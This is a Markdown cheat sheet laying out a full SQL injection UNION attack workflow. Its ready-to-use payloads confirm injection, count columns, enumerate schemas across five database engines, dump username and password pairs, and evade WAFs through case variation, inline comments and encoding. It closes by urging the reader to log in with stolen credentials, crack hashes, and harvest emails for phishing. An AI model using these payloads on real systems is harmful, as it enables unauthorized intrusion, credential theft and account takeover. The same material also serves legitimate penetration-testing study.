# SQL Injection UNION Attack — Full Workflow

---

## What It Is

The app reflects query results directly on the page (product listings, search results, user profiles, etc.). You append a second `SELECT` via `UNION` to hijack the output and display your own data. The catch: your injected `SELECT` must return the **same number of columns** as the original query, and at least one column must accept strings.

---

## Step 1: Find the Injection Point

Test if the parameter is vulnerable:
```
'
```
Error or different behavior → injectable.

Other confirmation tests:
```
' OR '1'='1'--      ← always true, might return all rows
' AND '1'='2'--     ← always false, might return no rows
```

---

## Step 2: Determine Number of Columns

### Method A — ORDER BY (increment until error)
```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--      ← error here means 2 columns
```

### Method B — UNION SELECT NULL (increment until no error)
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```
No error = correct number of columns.

> **Oracle:** Every `SELECT` needs `FROM DUAL`:
> `' UNION SELECT NULL,NULL FROM DUAL--`

> **MySQL:** `--` needs a space after it. Use `-- -` or `#` instead.

---

## Step 3: Find String-Compatible Columns

Replace NULLs with string literals one at a time:
```
' UNION SELECT 'test',NULL,NULL--
' UNION SELECT NULL,'test',NULL--
' UNION SELECT NULL,NULL,'test'--
```
The one that doesn't error (and shows your string on the page) = your injectable column.

---

## Step 4: Enumerate Tables

### PostgreSQL / MySQL / MSSQL / SQLite
```
' UNION SELECT table_name,NULL FROM information_schema.tables--
```

### Oracle
```
' UNION SELECT table_name,NULL FROM all_tables--
```

### SQLite
```
' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'--
```

Look for interesting table names: `users`, `accounts`, `members`, `credentials`, `logins`.

> **Tip:** Filter out system tables with `WHERE table_schema='public'` (PostgreSQL) or `WHERE table_type='BASE TABLE'` (MySQL/MSSQL).

---

## Step 5: Enumerate Columns in Target Table

### PostgreSQL / MySQL / MSSQL
```
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

### Oracle
```
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--
```
> Oracle table names are UPPERCASE in catalog views.

### SQLite
```
' UNION SELECT sql,NULL FROM sqlite_master WHERE type='table' AND name='users'--
```
> SQLite returns the full `CREATE TABLE` statement — column names are inside it.

Look for columns like `username`, `password`, `email`, `api_key`, `token`.

---

## Step 6: Extract the Data

### Two or more string columns available
```
' UNION SELECT username,password FROM users--
```

### Only one string column available
Concatenate multiple values into one column:

| DB         | Syntax |
|------------|--------|
| PostgreSQL | `username\|\|':'\\|\|password` |
| MySQL      | `CONCAT(username,':',password)` |
| MSSQL      | `username+':'+password` |
| Oracle     | `username\|\|':'\|\|password` |
| SQLite     | `username\|\|':'\|\|password` |

Example (PostgreSQL, column 2 is string):
```
' UNION SELECT NULL,username||':'||password FROM users--
```

---

## Step 7: Version Fingerprint (Bonus)

Once you have UNION working, grab the DB version:

| DB         | Payload |
|------------|---------|
| PostgreSQL | `' UNION SELECT version(),NULL--` |
| MySQL      | `' UNION SELECT @@version,NULL--` |
| MSSQL      | `' UNION SELECT @@version,NULL--` |
| Oracle     | `' UNION SELECT banner,NULL FROM v$version WHERE rownum=1--` |
| SQLite     | `' UNION SELECT sqlite_version(),NULL--` |

---

## Step 8: Use the Data

Log in with the credentials you extracted. Or pivot — look for API keys, tokens, hashed passwords to crack offline, email addresses for phishing, etc.

---

## Real-World Tips

- **Column count mismatch** is the #1 reason UNION attacks fail. Always confirm column count before moving forward.
- **NULL padding:** If the original query has 5 columns and you only need 1, pad with NULLs: `' UNION SELECT NULL,NULL,target_data,NULL,NULL--`
- **No visible output?** The query might work but the app only renders the first row. Add a false condition to the original query to suppress its results: `' AND 1=2 UNION SELECT ...--`
- **WAF blocking `UNION`?** Try case variation (`uNiOn`), inline comments (`UN/**/ION`), double URL encoding, or XML entity encoding.
- **Multiple rows:** If the app only shows one row, use `LIMIT 1 OFFSET N` to iterate through results.
- **Hashed passwords:** Don't stop at extraction. Run them through hashcat/john. Common formats: MD5, bcrypt, SHA-256.

---

The mindset: broad → narrow → enumerate → extract → exploit.
